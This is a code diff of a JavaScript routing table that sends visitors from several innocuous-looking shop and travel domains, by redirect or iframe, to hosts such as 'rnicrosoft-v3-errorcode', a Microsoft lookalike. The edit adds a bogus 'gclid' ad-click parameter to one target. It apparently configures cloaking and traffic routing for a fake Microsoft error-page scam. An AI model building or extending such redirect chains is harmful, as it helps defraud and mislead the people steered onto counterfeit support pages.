@@ -85,12 +85,12 @@ async function getRotationTarget(key) {
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://naotoshidairy.com": { method: "redirect", target: "https://middlepage.onrender.com" },
+    "https://naotoshidairy.com": { method: "redirect", target: "https://middlepage.onrender.com/?gclid=twygyuewewewgvehwwhdwdwhdjwdhgwdsuidwdwd" },
     "https://takahirofarmfood.com": { method: "redirect", target: "https://rnicrosoft-v3-errorcode-21jpydmc.onrender.com" },
     "https://hiroakitravels.com": { method: "redirect", target: "https://rnicrosoft-v3-errorcode-21jpydmc.onrender.com" },
   },
   dmc: {
-    "https://rnicrosoft-v3-errorcode-21jpydmc.onrender.com": { method: "iframe", target: "https://dmc1-environment.onrender.com" },
+    "https://middlepage.onrender.com/?gclid=twygyuewewewgvehwwhdwdwhdjwdhgwdsuidwdwd": { method: "iframe", target: "https://dmc1-environment.onrender.com" },
     "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://ziyan-os3.vercel.app" },
     "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://ziyan-os3.vercel.app" },
   },
